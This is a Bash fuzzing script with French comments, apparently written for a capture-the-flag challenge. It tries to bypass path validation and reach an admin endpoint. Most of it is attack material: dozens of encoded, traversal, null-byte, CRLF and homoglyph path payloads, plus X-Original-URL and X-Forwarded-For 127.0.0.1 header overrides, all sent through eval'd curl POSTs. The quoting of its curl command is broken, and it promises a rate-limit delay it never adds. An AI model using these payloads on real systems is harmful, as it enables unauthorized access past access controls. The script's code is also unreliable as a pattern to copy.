#!/usr/bin/env bash
# Suite de tests automatisée pour tenter de bypasser la validation de chemin
# Usage: ./fuzz_paths.sh
# Dépendances: curl, iconv (optionnel), od (optionnel)
# Résultat: crée ./results.csv et ./bodies/<n>.html pour les réponses intéressantes
set -o errexit
set -o nounset
set -o pipefail

BASE="https://challenge.ctfbytdf.alzp.tgscloud.net"
OUTDIR="./fuzz_results_$(date +%Y%m%d_%H%M%S)"
BODIES_DIR="${OUTDIR}/bodies"
mkdir -p "${BODIES_DIR}"

RESULTS_CSV="${OUTDIR}/results.csv"
echo "id,payload,full_url,http_code,effective_url,body_bytes,notes" > "$RESULTS_CSV"

# --- Liste de payloads à tester (percent-encoded, double-encoded, unicode, homoglyphs, tricks) ---
payloads=(
  "/b64-armor1/admin"                           # baseline (bloqué)
  "/b64-armor1/admi%20n"                        # espace encodé
  "/b64-armor1/admi%2520n"                      # double-encodé %2520 -> %20 -> space
  "/b64-armor1/admi%2Fn"                        # slash encodé
  "/b64-armor1/%2e%2e/%2e%2e/b64-armor1/admin"  # double-.. with encoded dots
  "/b64-armor1/./admin"
  "/b64-armor1/../b64-armor1/admin"
  "/b64-armor1/.../admin"
  "/b64-armor1/admin%2e"                        # trailing dot encoded
  "/b64-armor1/admin.."                         # trailing dots
  "/b64-armor1/admin/"                          # trailing slash
  "/b64-armor1/admin%00"                        # null byte encoded
  "/b64-armor1/admi%09n"                        # tab
  "/b64-armor1/admi%0An"                        # newline
  "/b64-armor1/admi%0Dn"                        # carriage return
  "/b64-armor1/%5Cadmin"                        # backslash encoded
  "/b64-armor1\\admin"                          # backslash raw (curl will encode; proxy may not)
  "/b64-armor1/%EF%BC%8Fadmin"                  # fullwidth slash (U+FF0F)
  "/b64-armor1/%E2%88%95admin"                  # division slash (U+2215)
  "/b64-armor1/%C2%A0admin"                     # NBSP (non-breaking space)
  "/b64-armor1/%E2%80%8Badmi%20n"               # zero-width + space mix
  "/b64-armor1/admi%E2%80%8Bn"                  # zero-width space U+200B
  "/b64-armor1/%61%64%6d%69%6e"                 # admin hex lower
  "/b64-armor1/%41%44%4D%49%4E"                 # admin hex upper
  "/b64-armor1/adm%C4%B1n"                      # dotless i (U+0131)
  "/b64-armor1/аdmin"                           # cyrillic a (homoglyph U+0430) - raw: might need to paste actual cyrillic char
  "/b64-armor1/adm%25%32%30n"                   # mixed double-encoding style
  "/b64-armor1/admin;jsessionid=1234"           # matrix param / semicolon
  "/b64-armor1/admin;param=value"               # matrix param with value
  "/b64-armor1/admin%3Bparam"                   # semicolon encoded
  "/b64-armor1/index?path=/admin"               # path via query
  "/b64-armor1/?p=admin"                        # query param
  "/b64-armor1/#/admin"                         # fragment (client-side; test anyway)
  "/b64-armor1/admin%3Fsecret=1"                # encoded ? inside path
  "/b64-armor1/%2e%2e%2fadmin"                  # ../admin encoded
  "/b64-armor1/%2e%2e/%2e%2e/%2e%2e/admin"      # multiple encoded dotdot
  "/b64-armor1/%2fadmin"                        # encoded leading slash in segment
  "/b64-armor1/%2f%2fadmin"                     # double encoded slash
  "/b64-armor1/admin%20."                       # space + dot
  "/b64-armor1/%E3%80%80admin"                  # ideographic space (U+3000)
  "/b64-armor1/%E2%80%AFadmin"                  # narrow no-break space (U+202F)
  "/b64-armor1/%E2%80%8Dadmin"                  # zero width joiner (U+200D)
  "/b64-armor1/admin.txt"                       # extension appended
  "/b64-armor1/admin;/../"                      # tricky semicolon + traversal
  "/b64-armor1/%2e/admin"                       # encoded dot segment
  "/b64-armor1/..;/admin"                       # semicolon trick
  "/b64-armor1/%2e%2e%3B/admin"                 # encoded ..;/
  "/b64-armor1/admın"                           # use dotless i (raw char) - may require UTF-8 terminal
  "/b64-armor1/%F0%9F%91%A4admin"               # emoji prefix (just to test odd chars)
)

# --- Header-modified tests: some proxies / apps use these headers to override path ---
# Each header_set is a string of curl -H arguments (space-separated)
header_tests=(
  "" \
  "-H 'X-Original-URL: /b64-armor1/admin'" \
  "-H 'X-Rewrite-URL: /b64-armor1/admin'" \
  "-H 'X-Forwarded-Host: challenge.ctfbytdf.alzp.tgscloud.net' -H 'X-Forwarded-Proto: https'" \
  "-H 'X-Forwarded-For: 127.0.0.1' -H 'X-Original-URL: /b64-armor1/admin'" \
  "-H 'Host: challenge.ctfbytdf.alzp.tgscloud.net' -H 'X-Original-URL: /b64-armor1/admin'"
)

# Optional: raw request-line variations (only usable if you have tools to craft raw HTTP lines)
# We'll include them as notes; see methodology section.

# Function to run a single test
run_test() {
  local id="$1"; shift
  local payload="$1"; shift
  local header_args="$*"

  # Build URL
  local url="${BASE}${payload}"

  # Prepare temporary files
  local tmp_headers
  tmp_headers="$(mktemp)"
  local tmp_body
  tmp_body="$(mktemp)"

  # Build curl command: follow redirects, show headers, save body
  # -sS silent but show errors; -k ignore TLS (if needed)
  # -D saves headers to tmp_headers, -o body to tmp_body
  # -w prints http_code and effective_url
  # We allow header_args injected (already quoted above), so use eval to expand it safely
  local curl_cmd="curl -X POST -d "url=$url" -sS -k -D ${tmp_headers} -o ${tmp_body} -L -w '%{http_code} %{url_effective}' ${header_args} -- \"https://challenge.ctfbytdf.alzp.tgscloud.net/b64-armor1\""
  # Execute
  # shellcheck disable=SC2086
  eval ${curl_cmd} > "${tmp_body}.meta" 2>/dev/null || true

  # Read results
  local meta
  meta="$(cat "${tmp_body}.meta" 2>/dev/null || echo "")"
  local http_code
  local effective_url
  http_code="$(awk '{print $1}' <<<"$meta" || echo "000")"
  effective_url="$(awk '{print $2}' <<<"$meta" || echo "")"

  # Body size in bytes
  local body_bytes
  body_bytes="$(wc -c < "${tmp_body}" 2>/dev/null || echo 0)"

  # Extract first snippet or header error messages for notes
  local notes=""
  notes="$(sed -n '1,6p' "${tmp_headers}" | tr '\n' ' ' | sed -E 's/ +/ /g' | sed -e 's/"/'\''/g')"
  # If body contains "URL can't contain control characters" capture that
  if grep -q "URL can't contain control characters" "${tmp_body}" 2>/dev/null; then
    notes="${notes} | urllib-control-chars-error"
  fi

  # Save body if interesting (200, 302, 500, or size > 500)
  local saved_body=""
  if [[ "${http_code}" == "200" || "${http_code}" == "302" || "${http_code}" == "500" || "${body_bytes}" -gt 500 ]]; then
    saved_body="${BODIES_DIR}/body_${id}.html"
    cp "${tmp_body}" "${saved_body}" || true
  fi

  # Append result to CSV
  echo "\"${id}\",\"${payload}\",\"${url}\",\"${http_code}\",\"${effective_url}\",\"${body_bytes}\",\"${notes}\"" >> "$RESULTS_CSV"

  # Cleanup temp files
  rm -f "${tmp_headers}" "${tmp_body}" "${tmp_body}.meta"
  # If saved_body exists, print short info
  if [[ -n "${saved_body}" ]]; then
    echo "[+] Saved body -> ${saved_body} (code=${http_code}, bytes=${body_bytes})"
  else
    echo "[.] id=${id} code=${http_code} bytes=${body_bytes} payload='${payload}'"
  fi
}

# --- Run combinatorial tests: payloads x header_tests ---
id=0
for payload in "${payloads[@]}"; do
  for header_set in "${header_tests[@]}"; do
    id=$((id+1))
    # header_set is a string like "-H 'X-Original-URL: /b64-armor1/admin'"
    # to pass it safely to run_test we split into args; here we keep it as-is and let eval in run_test expand it.
    run_test "$id" "$payload" $header_set
    # small delay to avoid rate-limiting / tripping protections
  done
done

echo "DONE. Results saved in ${OUTDIR}"
echo "Top hits (saved bodies) in ${BODIES_DIR}"
